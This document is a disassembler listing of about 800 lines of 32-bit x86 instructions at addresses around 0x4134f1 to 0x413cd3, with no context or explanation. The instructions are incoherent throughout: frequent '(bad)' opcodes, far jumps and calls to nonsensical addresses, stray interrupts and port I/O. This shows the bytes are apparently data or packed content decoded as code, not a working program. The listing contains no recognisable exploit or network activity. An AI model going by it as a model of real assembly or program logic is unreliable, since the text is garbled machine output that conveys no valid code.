  4134f1:	fndisi(8087 only) 
  4134f3:	cld    
  4134f4:	loope  0x413511
  4134f6:	jmp    0xe7b2:0x3c5ca7f3
  4134fd:	shl    DWORD PTR [ecx+ebx*1],0xe7
  413501:	mov    al,0xd7
  413503:	dec    edx
  413504:	loope  0x413570
  413506:	jo     0x413525
  413508:	jnp    0x41354b
  41350a:	in     eax,0x78
  41350c:	add    al,0xa5
  41350e:	sbb    DWORD PTR [ebx-0x5e],edx
  413511:	imul   esp,DWORD PTR [edx-0x14],0x797ed7e7
  413518:	push   ebp
  41351a:	mov    ecx,0x53314784
  41351f:	retf   
  413520:	xor    DWORD PTR [ecx-0x6a],0xffffffd9
  413524:	mov    bl,BYTE PTR [esi+0x3d]
  413527:	shl    BYTE PTR [edi+0x34857a14],1
  41352d:	add    cl,dl
  41352f:	push   0x70ae5ad6
  413534:	jecxz  0x413589
  413536:	mov    al,ds:0x18dbfd28
  41353b:	xchg   ecx,ecx
  41353d:	jmp    0x29fa50a5
  413542:	mov    edx,0x5542da38
  413547:	mov    ds:0xb761e19f,eax
  41354c:	js     0x4135aa
  41354e:	repnz in al,0x6e
  413551:	push   esp
  413552:	and    ch,BYTE PTR [esi+ecx*4-0x4e]
  413556:	and    bh,dh
  413558:	ror    BYTE PTR [esi-0x3fbe67a7],cl
  41355e:	xor    dh,dl
  413560:	jl     0x413524
  413562:	jmp    0x75c1:0xc0d35134
  413569:	push   ss
  41356a:	outs   dx,BYTE PTR ds:[esi]
  41356b:	call   DWORD PTR [ebp+0xe]
  41356e:	mov    ebx,0xe8aca1e4
  413573:	sbb    al,0x51
  413575:	hlt    
  413576:	sub    edx,DWORD PTR [esi-0x5e]
  413579:	(bad)  
  41357a:	xchg   ebx,eax
  41357b:	es sub ecx,ebx
  41357e:	xor    al,0xec
  413580:	retf   0xa2c6
  413583:	push   ebp
  413584:	jecxz  0x41352e
  413586:	add    eax,0xc64640de
  41358b:	pop    ecx
  41358c:	push   edi
  41358d:	fs mov esi,0x7a1be552
  413593:	adc    bl,BYTE PTR [esi]
  413595:	xchg   edx,eax
  413596:	pushf  
  413597:	imul   edx,DWORD PTR [ebx-0x1b],0x6cbbde27
  41359e:	dec    ebp
  41359f:	dec    ecx
  4135a0:	cmp    al,0x9f
  4135a2:	pusha  
  4135a3:	out    0xb8,al
  4135a5:	(bad)  
  4135a6:	push   ebx
  4135a7:	std    
  4135a8:	stc    
  4135a9:	test   bh,bl
  4135ab:	fldcw  WORD PTR [esi-0x6d19c853]
  4135b1:	push   edi
  4135b2:	pop    ecx
  4135b3:	xor    eax,0x2a5f32ff
  4135b8:	jecxz  0x41362c
  4135ba:	mov    ch,0xd8
  4135bc:	cld    
  4135bd:	mov    BYTE PTR [ecx+0x156be03f],bl
  4135c3:	dec    ecx
  4135c4:	stc    
  4135c5:	lods   al,BYTE PTR fs:[esi]
  4135c7:	pop    esp
  4135c8:	push   ebp
  4135c9:	lahf   
  4135ca:	fist   WORD PTR [ecx-0x57f0dea6]
  4135d0:	mov    DWORD PTR [eax-0x5b],eax
  4135d3:	jns    0x413560
  4135d5:	int    0x48
  4135d7:	mov    ah,0xbc
  4135d9:	rdpmc  
  4135db:	dec    edi
  4135dc:	ror    BYTE PTR [edx-0x4c],cl
  4135df:	push   es
  4135e0:	add    edx,DWORD PTR [eax+0x7cc335be]
  4135e6:	retf   0x8196
  4135e9:	push   edx
  4135ea:	push   edx
  4135eb:	int    0x81
  4135ed:	add    eax,0x26d7e9ad
  4135f2:	cld    
  4135f3:	or     al,0xad
  4135f5:	inc    esp
  4135f6:	scas   eax,DWORD PTR es:[edi]
  4135f7:	ret    0x56b6
  4135fa:	jg     0x41362c
  4135fc:	popa   
  4135fd:	jmp    0x4a787ea
  413602:	add    al,0xc
  413604:	int    0x5d
  413606:	cwde   
  413607:	lahf   
  413608:	mov    dh,0x54
  41360a:	ss xor eax,0xbeafc1e8
  413610:	add    bl,BYTE PTR [edx]
  413612:	xor    al,0xed
  413614:	cli    
  413615:	mov    al,0x79
  413617:	cmp    al,ch
  413619:	jle    0x413684
  41361b:	push   ebp
  41361c:	fnsave [ebp-0x75]
  41361f:	adc    BYTE PTR [esi],bl
  413621:	pusha  
  413622:	call   0x3931001e
  413627:	dec    ebx
  413628:	stos   BYTE PTR es:[edi],al
  413629:	cmp    edx,DWORD PTR [esi]
  41362b:	sub    dh,ah
  41362d:	loope  0x41363c
  41362f:	mov    dh,0x19
  413631:	arpl   WORD PTR [ebx+0x4],di
  413634:	int    0x40
  413636:	sar    BYTE PTR [edx+0xa],0xd1
  41363a:	shl    DWORD PTR [ebx+edx*8],0xf8
  41363e:	sbb    BYTE PTR [ebp+0x1f],ch
  413641:	call   0x650df4e4
  413646:	push   es
  413647:	(bad)  
  413649:	mov    BYTE PTR [ecx-0x16],ch
  41364c:	push   esp
  41364d:	xor    bh,BYTE PTR [edx-0x38]
  413650:	scas   eax,DWORD PTR es:[edi]
  413651:	and    BYTE PTR [esi+0x20],al
  413654:	pop    ebp
  413655:	jg     0x413688
  413657:	cmp    DWORD PTR [ebx],ebx
  413659:	dec    esp
  41365a:	jno    0x413643
  41365c:	stos   DWORD PTR es:[edi],eax
  41365d:	in     al,0xa4
  41365f:	sbb    al,0xfe
  413661:	(bad)  
  413662:	aaa    
  413663:	jmp    0xda71:0xd836546e
  41366a:	push   0x7d11db9b
  41366f:	out    0x69,al
  413671:	in     al,dx
  413672:	push   edi
  413673:	inc    esi
  413674:	push   ecx
  413675:	push   edi
  413676:	(bad)  
  413677:	sbb    al,0x11
  413679:	repz add cl,BYTE PTR [ecx+ebp*1+0x3d]
  41367e:	cs je  0x4136a9
  413681:	ret    0x49b3
  413684:	fcomp  QWORD PTR [ebp-0x6ac234bf]
  41368a:	cmp    DWORD PTR [eax+0x1cb7ee33],esi
  413690:	push   ss
  413691:	jbe    0x4136c3
  413693:	pop    esp
  413694:	and    DWORD PTR [edx],0x1c
  413697:	repz inc edi
  413699:	rcr    ecx,0x44
  41369c:	cdq    
  41369d:	xchg   DWORD PTR [edx+0x8533b2e],ebp
  4136a3:	inc    esp
  4136a4:	retf   0xc7
  4136a7:	fild   DWORD PTR [edi]
  4136a9:	push   cs
  4136aa:	mov    dh,0xf7
  4136ac:	push   edi
  4136ad:	call   0x4bd3:0x8175c353
  4136b4:	mov    al,ds:0xa076f127
  4136b9:	dec    ebx
  4136ba:	scas   al,BYTE PTR es:[edi]
  4136bb:	add    eax,0xed827220
  4136c0:	shr    DWORD PTR [ebx+0x4eb705a3],0x14
  4136c7:	es sbb cl,dh
  4136ca:	sahf   
  4136cb:	dec    edx
  4136cc:	mov    al,0x77
  4136ce:	add    BYTE PTR [ecx],dh
  4136d0:	jns    0x4136d4
  4136d2:	lea    ecx,[edi-0x431329bd]
  4136d8:	cmp    cl,dl
  4136da:	(bad)  
  4136db:	mov    BYTE PTR [edx],0x9c
  4136de:	or     esi,ebp
  4136e0:	pop    ecx
  4136e1:	sbb    ch,BYTE PTR [eax-0x4e091306]
  4136e7:	xchg   DWORD PTR [ecx],ebp
  4136e9:	xchg   edi,eax
  4136ea:	in     al,dx
  4136eb:	fwait
  4136ec:	aas    
  4136ed:	sub    eax,0x28e968c8
  4136f2:	repz cmp bh,BYTE PTR [edi-0x38]
  4136f6:	push   ds
  4136f7:	push   ds
  4136f8:	or     eax,0x14b0ec6c
  4136fd:	cdq    
  4136fe:	cmp    BYTE PTR [ebp-0x3],0x27
  413702:	add    DWORD PTR [ecx-0x3c],esi
  413705:	add    ch,dl
  413707:	jns    0x413787
  413709:	jg     0x41370e
  41370b:	call   0x93ed21cc
  413710:	dec    ebx
  413711:	(bad)  
  413712:	(bad)  
  413713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413714:	jmp    0x4136a1
  413716:	inc    edx
  413717:	shl    DWORD PTR [ecx+0x44],0xc
  41371b:	inc    esi
  41371c:	xchg   esi,eax
  41371d:	jp     0x413775
  41371f:	iret   
  413720:	push   eax
  413721:	or     esp,ecx
  413723:	mov    ch,0x6c
  413725:	mul    DWORD PTR [edx]
  413727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413728:	stos   DWORD PTR es:[edi],eax
  413729:	bnd jae 0x4136fe
  41372c:	inc    ebp
  41372d:	(bad)  
  41372e:	xlat   BYTE PTR ds:[ebx]
  41372f:	mov    es,WORD PTR [ebx+0x56cc360b]
  413735:	and    dl,BYTE PTR [ebx-0x56f78ad9]
  41373b:	jo     0x4136db
  41373d:	push   ebx
  41373e:	adc    DWORD PTR ds:[esi-0x60c1abbc],0xffffff8c
  413746:	enter  0x43ec,0x47
  41374a:	add    esi,DWORD PTR [eax+0x18bee1fa]
  413750:	imul   ebx,DWORD PTR [esi+0x465ba284],0xffffffd6
  413757:	push   ds
  413758:	aad    0x75
  41375a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41375b:	add    BYTE PTR [ecx-0x25],ah
  41375e:	rol    DWORD PTR [edx+ecx*1+0xbe98b53],0x94
  413766:	or     DWORD PTR [edx],ebx
  413768:	stos   DWORD PTR es:[edi],eax
  413769:	push   edx
  41376a:	adc    al,0xef
  41376c:	lods   eax,DWORD PTR ds:[esi]
  41376d:	adc    DWORD PTR [esi+0x9],ecx
  413770:	(bad)  
  413771:	mov    ch,0x5c
  413773:	inc    ebp
  413774:	(bad)  
  413775:	imul   eax,DWORD PTR [edi+0x3],0xffffff90
  413779:	(bad)  
  41377a:	dec    ebx
  41377b:	xor    ecx,eax
  41377d:	add    ecx,DWORD PTR [edx+0x60]
  413780:	movlps QWORD PTR [ebx-0x193163e],xmm2
  413787:	dec    ecx
  413788:	jle    0x41379b
  41378a:	mov    dl,0x1c
  41378c:	cmp    al,0xd5
  41378e:	sub    DWORD PTR [ecx],0x77fb6d14
  413794:	rcr    ch,cl
  413796:	jmp    0xd37b:0x2243388c
  41379d:	fcomp  DWORD PTR [edx-0x57c248ff]
  4137a3:	or     al,ch
  4137a5:	es sahf 
  4137a7:	push   esp
  4137a8:	rol    BYTE PTR [edx+0x6e91561c],cl
  4137ae:	add    al,0x29
  4137b0:	fidivr WORD PTR [eax]
  4137b2:	sar    bl,1
  4137b4:	inc    ecx
  4137b5:	icebp  
  4137b6:	and    DWORD PTR [ebx+0x20],esp
  4137b9:	lahf   
  4137ba:	jg     0x41373c
  4137bc:	ficom  DWORD PTR [ebx+0x1f490fd3]
  4137c2:	jns    0x413768
  4137c4:	retf   0xc896
  4137c7:	cld    
  4137c8:	bound  edi,QWORD PTR [ebx+0x2271b4f7]
  4137ce:	pop    ecx
  4137cf:	xchg   BYTE PTR [ecx],bh
  4137d1:	lock les edx,FWORD PTR [ecx-0x54a974d2]
  4137d8:	or     DWORD PTR [esp+ebp*4-0x1c],edx
  4137dc:	call   0x8d38:0x1abe9aa
  4137e3:	mov    ebx,0x2f80127b
  4137e8:	cmp    DWORD PTR [edx],ebx
  4137ea:	mov    esp,0x48f20078
  4137ef:	mov    WORD PTR [eax+0x62536817],ds
  4137f5:	mov    ss,WORD PTR [ebx+ecx*8]
  4137f8:	xchg   ebx,eax
  4137f9:	cs xor al,0x9b
  4137fc:	ror    BYTE PTR [edi+esi*2-0x5c13216b],1
  413803:	ret    
  413804:	mov    ebx,0xa53f5e68
  413809:	mov    eax,ds:0xa8587e11
  41380e:	dec    edx
  41380f:	gs dec esi
  413811:	rcl    DWORD PTR [edx+0x3114b52c],cl
  413817:	imul   esp,DWORD PTR [eax+esi*2-0x6],0xc27656b0
  41381f:	xlat   BYTE PTR ds:[ebx]
  413820:	jmp    0xbe20182b
  413825:	add    eax,0x77d7174d
  41382a:	sub    DWORD PTR [ecx],eax
  41382c:	int3   
  41382d:	pop    ebp
  41382e:	retf   0x83d6
  413831:	dec    esi
  413832:	out    dx,al
  413833:	sbb    eax,0x95f3a183
  413838:	(bad)  
  413839:	xor    esi,DWORD PTR [ecx+0x6866965d]
  41383f:	add    ah,al
  413841:	fild   WORD PTR [eax]
  413843:	mov    eax,ds:0x122c7966
  413848:	fsub   st,st(4)
  41384a:	in     eax,0xb9
  41384c:	shl    bl,0xde
  41384f:	retf   0xc25e
  413852:	mov    ds:0x32ffabb,eax
  413857:	or     eax,0x20b6f18f
  41385c:	push   0x6ff43adb
  413861:	enter  0xc733,0x7e
  413865:	ficomp DWORD PTR es:[edx]
  413868:	push   ss
  413869:	data16 add dl,cl
  41386c:	lock xchg BYTE PTR [eax-0x7963cb5d],bl
  413873:	retf   
  413874:	fcmove st,st(3)
  413876:	sbb    dh,al
  413878:	aam    0x40
  41387a:	mov    al,0xa1
  41387c:	push   ebx
  41387d:	fsubr  QWORD PTR [edx+0x37]
  413880:	rcl    BYTE PTR [ebx],cl
  413882:	xor    eax,0xf0bb867d
  413887:	call   0x31793be6
  41388c:	or     al,0x72
  41388e:	mov    ?,WORD PTR [ecx+0x6b]
  413891:	dec    esp
  413892:	xor    eax,0xcc1a7e71
  413897:	push   es
  413898:	in     eax,dx
  413899:	push   ds
  41389a:	sbb    DWORD PTR [edi],0x5c329adb
  4138a0:	fstp   TBYTE PTR [esp+ecx*4]
  4138a3:	retf   0x8fff
  4138a6:	in     al,dx
  4138a7:	push   edx
  4138a8:	or     DWORD PTR [esi+0x5e47ef43],edx
  4138ae:	les    ebp,FWORD PTR fs:[eax]
  4138b1:	adc    eax,0xa1adcebb
  4138b6:	mov    ds:0x72481c67,eax
  4138bb:	sbb    al,0x5b
  4138bd:	dec    ebx
  4138be:	nop
  4138bf:	test   al,0x24
  4138c1:	retf   0xf31d
  4138c4:	pop    ss
  4138c5:	aad    0x31
  4138c7:	ret    0x6212
  4138ca:	push   ebx
  4138cb:	cmc    
  4138cc:	(bad)  
  4138cd:	rol    BYTE PTR [ebp+0x68b1f353],1
  4138d3:	push   edi
  4138d4:	adc    DWORD PTR [eax-0xe],edx
  4138d7:	out    dx,al
  4138d8:	inc    eax
  4138d9:	inc    eax
  4138da:	ins    DWORD PTR es:[edi],dx
  4138db:	mov    ecx,0x7e12b762
  4138e0:	mov    BYTE PTR [ebx],ch
  4138e2:	(bad)  
  4138e3:	mov    eax,0xf5bd43f6
  4138e8:	pop    eax
  4138e9:	pop    eax
  4138ea:	xor    eax,0x604e0c71
  4138ef:	jmp    0x8fc7:0x735fe4fd
  4138f6:	xor    BYTE PTR [eax],dh
  4138f8:	sbb    al,0x3d
  4138fa:	ja     0x413912
  4138fc:	pop    es
  4138fd:	mov    cl,0x7c
  4138ff:	mov    ds:0x32714697,al
  413904:	retf   0x1db1
  413907:	mov    ecx,0xa3385abc
  41390c:	(bad)  
  41390d:	and    bh,BYTE PTR [esi]
  41390f:	or     BYTE PTR [ecx-0x44],bh
  413912:	and    eax,0xfe3dc198
  413917:	les    edi,FWORD PTR ds:0x548ceeb7
  41391d:	sbb    DWORD PTR ds:0x56936552,edi
  413923:	jg     0x4138df
  413925:	push   esi
  413926:	and    DWORD PTR [esi+0x78],0xffffffc7
  41392a:	and    ebx,DWORD PTR [edx+0x423c3757]
  413930:	adc    ebp,DWORD PTR [ecx+0x3]
  413933:	mov    cl,0x99
  413935:	pop    ebp
  413936:	push   eax
  413937:	int3   
  413938:	lds    ecx,FWORD PTR [esi+0x3e]
  41393b:	xor    ch,BYTE PTR [esi]
  41393d:	cmc    
  41393e:	pop    ds
  41393f:	cwde   
  413940:	popf   
  413941:	sbb    DWORD PTR [ecx],0xfdaddb6b
  413947:	cli    
  413948:	jb     0x4139b0
  41394a:	dec    eax
  41394b:	cs js  0x41393d
  41394e:	int    0x28
  413950:	cmp    dh,BYTE PTR [edx-0x3e]
  413953:	add    edx,ebp
  413955:	pop    ss
  413956:	test   al,0x77
  413958:	xchg   edi,eax
  413959:	hlt    
  41395a:	in     eax,0x3f
  41395c:	rcl    DWORD PTR [edx],0x3d
  41395f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413960:	and    eax,DWORD PTR [ecx-0x6ff1d907]
  413966:	popf   
  413967:	cdq    
  413968:	in     eax,dx
  413969:	xchg   BYTE PTR [edx],bh
  41396b:	cmp    edi,ebp
  41396d:	sub    BYTE PTR [ecx-0x15],al
  413970:	dec    edi
  413971:	fnstsw WORD PTR [esi]
  413973:	mov    ebp,DWORD PTR [esi]
  413975:	cld    
  413976:	in     al,dx
  413977:	lea    esi,[ebx+0x75eb58c3]
  41397d:	cld    
  41397e:	lock xacquire xchg BYTE PTR [edx],ch
  413982:	jle    0x4139ae
  413984:	mov    ds:0x8badc586,al
  413989:	repnz add DWORD PTR [ebx+eiz*2],0xffffff83
  41398e:	(bad)  
  41398f:	into   
  413990:	rol    ecx,1
  413992:	dec    ebp
  413993:	push   0xeedcead9
  413998:	dec    esp
  413999:	sub    ebx,ebx
  41399b:	out    dx,al
  41399c:	gs mov ah,0xcd
  41399f:	adc    BYTE PTR [edx+0x26],cl
  4139a2:	mov    edx,ecx
  4139a4:	data16 adc dh,BYTE PTR [edi]
  4139a7:	cmp    al,0xc0
  4139a9:	movaps XMMWORD PTR [eax],xmm0
  4139ac:	arpl   WORD PTR [ecx+0xa],cx
  4139af:	jmp    0x4139b6
  4139b1:	enter  0xdcba,0x9b
  4139b5:	ds loop 0x4139ec
  4139b8:	scas   al,BYTE PTR es:[edi]
  4139b9:	push   edx
  4139ba:	mov    esi,0xe8ebb345
  4139bf:	or     BYTE PTR [edx+0xd959b71],dl
  4139c5:	sbb    BYTE PTR [ecx+0x2],0x4c
  4139c9:	xchg   edi,eax
  4139ca:	fs push es
  4139cc:	aam    0xb4
  4139ce:	inc    eax
  4139cf:	cld    
  4139d0:	jnp    0x413990
  4139d2:	gs inc esi
  4139d4:	jle    0x4139ec
  4139d6:	jmp    0xa9ab9865
  4139db:	clc    
  4139dc:	ds int 0x96
  4139df:	sub    eax,0x7750f5a2
  4139e4:	ret    0x3d6a
  4139e7:	call   FWORD PTR [esi+0x6a]
  4139ea:	inc    eax
  4139eb:	and    eax,ebx
  4139ed:	mov    ch,0xb2
  4139ef:	fwait
  4139f0:	loop   0x413a02
  4139f2:	jo     0x4139f4
  4139f4:	dec    ecx
  4139f5:	mov    eax,0x28fb0306
  4139fa:	sahf   
  4139fb:	dec    edi
  4139fc:	fidivr WORD PTR [esi-0x1b233022]
  413a02:	fld    QWORD PTR [ecx+0x57]
  413a05:	push   ds
  413a06:	cwde   
  413a07:	push   es
  413a08:	adc    DWORD PTR [ecx+edi*4+0x7e5e6dbf],ecx
  413a0f:	pop    ds
  413a10:	loopne 0x413a80
  413a12:	push   0x13
  413a14:	adc    DWORD PTR [edx+ecx*8],edx
  413a17:	mov    eax,0x856ba5e0
  413a1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a1d:	sar    BYTE PTR [ecx],1
  413a1f:	dec    ebp
  413a20:	dec    edx
  413a21:	fild   QWORD PTR [edx]
  413a23:	in     eax,0xc7
  413a25:	iret   
  413a26:	push   edi
  413a27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a28:	imul   esp,edi,0x6f
  413a2b:	inc    edx
  413a2c:	push   0x0
  413a2e:	xor    DWORD PTR [ecx+ecx*8-0x76],edi
  413a32:	std    
  413a33:	dec    esp
  413a34:	addr16 std 
  413a36:	mov    al,0x67
  413a38:	jnp    0x413aa3
  413a3a:	aad    0x79
  413a3c:	(bad)  
  413a3d:	mov    eax,0x13b84eae
  413a42:	mov    ebx,cs
  413a44:	and    DWORD PTR [edi-0x80],ecx
  413a47:	inc    ebp
  413a48:	scas   al,BYTE PTR es:[edi]
  413a49:	add    ebp,ecx
  413a4b:	scas   al,BYTE PTR es:[edi]
  413a4c:	mov    WORD PTR [edx-0x71c31004],cs
  413a52:	add    eax,0x1e953174
  413a57:	ins    DWORD PTR es:[edi],dx
  413a58:	xchg   edi,eax
  413a59:	cmc    
  413a5a:	inc    esp
  413a5b:	mov    bh,0x79
  413a5d:	xor    BYTE PTR [edi+0x6dd323b2],ah
  413a63:	and    eax,0xdfc74028
  413a68:	add    BYTE PTR [ebx+0x7d],ch
  413a6b:	lock adc al,0x87
  413a6e:	and    eax,0x6894903b
  413a73:	lods   eax,DWORD PTR ds:[esi]
  413a74:	pop    es
  413a75:	sbb    edi,eax
  413a77:	jbe    0x413ad1
  413a79:	push   ss
  413a7a:	outs   dx,DWORD PTR ds:[esi]
  413a7b:	sahf   
  413a7c:	nop
  413a7d:	and    al,0x35
  413a7f:	mov    cs,WORD PTR [ebx+0x7519bbba]
  413a85:	ins    BYTE PTR es:[edi],dx
  413a86:	inc    esp
  413a87:	in     eax,0x17
  413a89:	dec    ebp
  413a8a:	icebp  
  413a8b:	push   ebx
  413a8c:	sbb    DWORD PTR es:[ebx-0x4af38b68],ebx
  413a93:	les    eax,FWORD PTR ds:[edi]
  413a96:	xor    bh,BYTE PTR [esi]
  413a98:	inc    edi
  413a99:	push   ecx
  413a9a:	ja     0x413ae0
  413a9c:	imul   ebx,DWORD PTR [edx],0x5d
  413a9f:	adc    BYTE PTR [ebp-0x2e],cl
  413aa2:	cmp    bl,BYTE PTR [eax+0x4de8f854]
  413aa8:	and    al,0x7d
  413aaa:	jl     0x413a90
  413aac:	inc    esi
  413aad:	and    eax,edx
  413aaf:	inc    ecx
  413ab0:	hlt    
  413ab1:	mov    edx,0x6b71548
  413ab6:	or     esp,DWORD PTR [eax+0x4ab1bb6a]
  413abc:	add    BYTE PTR [esi],ch
  413abe:	sahf   
  413abf:	or     eax,0x83c5a99b
  413ac4:	aad    0xe7
  413ac6:	sbb    al,0x97
  413ac8:	dec    ebp
  413ac9:	mov    ebx,0xb0aeefa6
  413ace:	mov    edx,ebp
  413ad0:	in     eax,dx
  413ad1:	xchg   edx,eax
  413ad2:	push   0x2f22ffc5
  413ad7:	ficom  DWORD PTR [eax-0x6860429e]
  413add:	cs stos BYTE PTR es:[edi],al
  413adf:	xchg   esp,eax
  413ae0:	out    dx,al
  413ae1:	cdq    
  413ae2:	mov    ebp,0x9057fbbd
  413ae7:	imul   ebx,DWORD PTR [ebp+0x9],0xf43586c9
  413aee:	shl    DWORD PTR [ecx+0xf],0x46
  413af2:	inc    eax
  413af3:	retf   0xbd2a
  413af6:	test   BYTE PTR gs:[ecx-0x2c],bh
  413afa:	xchg   ebp,eax
  413afb:	or     BYTE PTR [ecx+edi*8+0x20],dh
  413aff:	dec    ecx
  413b00:	sbb    ch,BYTE PTR [ebx+0x2d]
  413b03:	push   eax
  413b04:	cld    
  413b05:	mov    ebp,edx
  413b07:	pop    ss
  413b08:	or     DWORD PTR [edx+edx*1+0x20],eax
  413b0c:	call   0x7ac60b6f
  413b11:	cld    
  413b12:	sub    al,ah
  413b14:	mov    esp,0x8e5c463c
  413b19:	int3   
  413b1a:	repnz mov dh,0x3b
  413b1d:	stos   DWORD PTR es:[edi],eax
  413b1e:	ins    DWORD PTR es:[edi],dx
  413b1f:	std    
  413b20:	sbb    eax,ebx
  413b22:	in     al,0xad
  413b24:	dec    ecx
  413b25:	pushf  
  413b26:	rcr    BYTE PTR [ecx],1
  413b28:	or     cl,cl
  413b2a:	jnp    0x413b6c
  413b2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b2d:	test   BYTE PTR [esi],al
  413b2f:	pop    es
  413b30:	shl    BYTE PTR [ecx-0x4308328a],0xe2
  413b37:	in     eax,0x84
  413b39:	sbb    ch,cl
  413b3b:	leave  
  413b3c:	xchg   edi,eax
  413b3d:	cmp    bl,BYTE PTR [ecx-0x1f]
  413b40:	add    bh,dh
  413b42:	xor    eax,0xf959d3a
  413b47:	loop   0x413b0a
  413b49:	jmp    0x1943:0x1370c67a
  413b50:	mov    bl,0xe4
  413b52:	aad    0x7c
  413b54:	out    0x3b,al
  413b56:	in     al,0x3
  413b58:	sub    dh,cl
  413b5a:	adc    bh,BYTE PTR ds:0xb3cc7508
  413b60:	pop    ds
  413b61:	aas    
  413b62:	inc    ebx
  413b63:	jl     0x413b37
  413b65:	sub    DWORD PTR [edi+0x31],ecx
  413b68:	popf   
  413b69:	jne    0x413b01
  413b6b:	jbe    0x413b7f
  413b6d:	push   cs
  413b6e:	int3   
  413b6f:	pop    edi
  413b70:	and    DWORD PTR [esi],eax
  413b72:	cs pop eax
  413b74:	xor    dh,dl
  413b76:	push   eax
  413b77:	loopne 0x413b01
  413b79:	or     DWORD PTR [ebx+0x69859ef7],esp
  413b7f:	pop    ecx
  413b80:	call   0x4d9e:0xdab2f996
  413b87:	setns  BYTE PTR [edi+eiz*8+0x75]
  413b8c:	and    al,BYTE PTR [edx+0x15]
  413b8f:	ja     0x413bd4
  413b91:	cld    
  413b92:	stos   DWORD PTR es:[edi],eax
  413b93:	mov    edx,0x404804d6
  413b98:	lods   al,BYTE PTR gs:[esi]
  413b9a:	test   BYTE PTR [edx],bh
  413b9c:	out    0xec,eax
  413b9e:	adc    eax,DWORD PTR [ecx]
  413ba0:	dec    esi
  413ba1:	sbb    al,0x79
  413ba3:	jno    0x413bd1
  413ba5:	sub    al,0xe3
  413ba7:	jns    0x413ba8
  413ba9:	ins    BYTE PTR es:[edi],dx
  413baa:	fst    QWORD PTR [eax-0x41]
  413bad:	fstp   QWORD PTR [ebp-0x48]
  413bb0:	addr16 or eax,0xb9301e36
  413bb6:	out    0x84,al
  413bb8:	mov    ds:0x22dd6fcf,eax
  413bbd:	not    ecx
  413bbf:	cmp    dl,al
  413bc1:	into   
  413bc2:	stos   DWORD PTR es:[edi],eax
  413bc3:	lea    edi,[ebx]
  413bc5:	cmp    dh,bl
  413bc7:	pop    esp
  413bc8:	push   esi
  413bc9:	mov    ds:0x619f32e6,al
  413bce:	and    al,0xa5
  413bd0:	mov    BYTE PTR [edi],dh
  413bd2:	mov    WORD PTR [edi-0x7349ee07],es
  413bd8:	out    0x78,eax
  413bda:	enter  0xe684,0x6d
  413bde:	mov    cl,0xc2
  413be0:	xchg   ecx,eax
  413be1:	ins    DWORD PTR es:[edi],dx
  413be2:	add    ecx,DWORD PTR [edx+0x2]
  413be5:	sub    esi,DWORD PTR [ecx-0x35]
  413be8:	inc    esp
  413be9:	loope  0x413bc7
  413beb:	scas   eax,DWORD PTR es:[edi]
  413bec:	sub    al,0x13
  413bee:	out    0x7c,eax
  413bf0:	fs (bad) 
  413bf2:	punpckhwd mm0,QWORD PTR [edi]
  413bf5:	xor    dl,BYTE PTR [ebx-0x4f]
  413bf8:	pop    esi
  413bf9:	mov    bl,0x7d
  413bfb:	neg    DWORD PTR [esi-0x797453c2]
  413c01:	mov    esi,0x134d8d99
  413c06:	mov    edi,0x9c4ca5c4
  413c0b:	out    dx,eax
  413c0c:	jnp    0x413bac
  413c0e:	dec    ecx
  413c0f:	outs   dx,DWORD PTR ds:[esi]
  413c10:	cmc    
  413c11:	call   0x97f1817d
  413c16:	in     eax,dx
  413c17:	push   ecx
  413c18:	adc    DWORD PTR [ebx+ecx*8-0x7e],edx
  413c1c:	data16 mov BYTE PTR ds:0x453500bf,cl
  413c23:	mov    DWORD PTR [ecx+edi*2+0x42],edi
  413c27:	ret    
  413c28:	jno    0x413c16
  413c2a:	jge    0x413bff
  413c2c:	mul    BYTE PTR ds:0xe11f222c
  413c32:	ss retf 
  413c34:	arpl   WORD PTR [ecx-0x23dc5486],sp
  413c3a:	mov    ecx,0xd2aa6673
  413c3f:	leave  
  413c40:	(bad)  
  413c41:	dec    eax
  413c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c43:	rcl    BYTE PTR [ebx],0x8b
  413c46:	pop    ecx
  413c47:	sbb    al,0xb6
  413c49:	iret   
  413c4a:	je     0x413bd5
  413c4c:	xor    ebp,edi
  413c4e:	mov    esp,0x8d5fa44e
  413c53:	pop    edx
  413c54:	sub    bh,0x5d
  413c57:	cmp    eax,DWORD PTR [esi]
  413c59:	aaa    
  413c5a:	mov    ah,0xc
  413c5c:	int3   
  413c5d:	mov    eax,0xc8928c5f
  413c62:	jne    0x413c0f
  413c64:	nop
  413c65:	ret    0x5567
  413c68:	data16 fwait
  413c6a:	icebp  
  413c6b:	fwait
  413c6c:	ins    DWORD PTR es:[edi],dx
  413c6d:	mov    eax,0x7a87207c
  413c72:	repnz popf 
  413c74:	inc    esp
  413c75:	cmp    bl,BYTE PTR [eax+eax*2+0x17]
  413c79:	pop    es
  413c7a:	in     eax,0xb0
  413c7c:	add    al,ch
  413c7e:	imul   ecx,DWORD PTR [esi+0x4da216c2],0xffffffd1
  413c85:	lock and DWORD PTR [eax-0x25e757c5],ebx
  413c8c:	inc    esp
  413c8d:	hlt    
  413c8e:	mov    ds:0xe342e0b5,eax
  413c93:	xor    bl,BYTE PTR [eax-0x29]
  413c96:	shl    BYTE PTR [ebx],cl
  413c98:	retf   
  413c99:	int    0x5e
  413c9b:	bound  esi,QWORD PTR [edi-0xf]
  413c9e:	in     al,dx
  413c9f:	mov    al,0xa2
  413ca1:	or     DWORD PTR [edx-0xc7306ae],ebx
  413ca7:	sti    
  413ca8:	pop    ebp
  413ca9:	fdiv   QWORD PTR [esi]
  413cab:	cmp    eax,0x1e0b1dc3
  413cb0:	xor    bh,BYTE PTR [esi+esi*4+0x17eb8d90]
  413cb7:	leave  
  413cb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cb9:	push   0xb5c87c39
  413cbe:	xor    dl,BYTE PTR [eax]
  413cc0:	add    ebp,DWORD PTR [esi]
  413cc2:	ficom  WORD PTR ds:0xdf4a0001
  413cc8:	jne    0x413cfa
  413cca:	mov    cs,ebp
  413ccc:	mov    bl,0x9d
  413cce:	jbe    0x413c78
  413cd0:	popa   
  413cd1:	fnstenv [ebx]
  413cd3:	frstor [ebx-0x43]
